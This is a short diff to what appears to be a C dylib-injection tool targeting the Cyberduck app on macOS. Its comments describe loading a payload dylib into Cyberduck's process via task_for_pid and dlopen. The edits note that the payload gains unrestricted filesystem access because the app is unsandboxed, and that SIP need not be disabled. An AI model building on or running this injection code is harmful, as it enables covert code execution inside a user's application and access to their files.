@@ -33,7 +33,8 @@
 //  5. Stage 2 (POSIX thread) can now safely call high-level BSD functions:
 //     → dlopen(path, RTLD_NOW)
 //     → dylib's __attribute__((constructor)) fires automatically
-//     → payload runs inside Cyberduck's process with its TCC permissions
+//     → payload runs inside Cyberduck's process with unrestricted user filesystem access
+//        (Cyberduck is app-sandbox=false — no TCC restrictions apply)
 //
 // ─────────────────────────────────────────────────────────────────────────────
 //
@@ -171,7 +172,7 @@ int main(int argc, char *argv[]) {
     kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
     if (kr != KERN_SUCCESS) {
         fprintf(stderr, "[-] task_for_pid: %s\n"
-                        "    Root? SIP disabled? Correct PID?\n",
+                        "    Root? Correct PID? (SIP does not need to be disabled for Cyberduck)\n",
                 mach_error_string(kr));
         return -1;
     }
